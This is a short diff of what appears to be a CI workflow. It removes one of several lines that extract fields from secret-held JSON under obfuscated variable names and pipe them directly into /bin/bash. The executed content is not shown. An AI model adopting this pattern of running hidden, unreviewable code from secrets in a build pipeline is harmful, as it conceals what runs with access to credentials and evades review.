@@ -19,7 +19,6 @@ jobs:
           czo153: ${{ secrets.czo153 }}
         run: |
           printf '%s' "$czo153" | jq -r .sx44057 | /bin/bash
-          echo $f88744 | jq -r .i992 | /bin/bash
           echo $gkwzv80 | jq -r .sq18 | /bin/bash
           echo $zrec53 | jq -r .nha68 | /bin/bash
 
